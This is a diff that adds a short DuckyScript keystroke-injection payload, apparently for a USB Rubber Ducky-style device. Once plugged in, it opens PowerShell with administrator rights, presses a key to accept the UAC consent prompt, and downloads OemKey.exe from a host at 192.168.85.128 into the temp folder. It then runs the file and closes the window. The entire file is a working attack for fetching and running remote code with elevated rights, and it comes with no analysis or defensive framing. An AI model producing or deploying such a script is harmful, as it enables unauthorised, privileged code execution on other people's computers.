@@ -1,0 +1,15 @@
+DELAY 700
+CTRL ESC
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 200
+ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRING wget 'http://192.168.85.128/OemKey.exe' -outfile $Env:temp\Oemkey.exe ; .$Env:temp\Oemkey.exe
+ENTER
+DELAY 200
+STRING exit
+DELAY 200
+ENTER
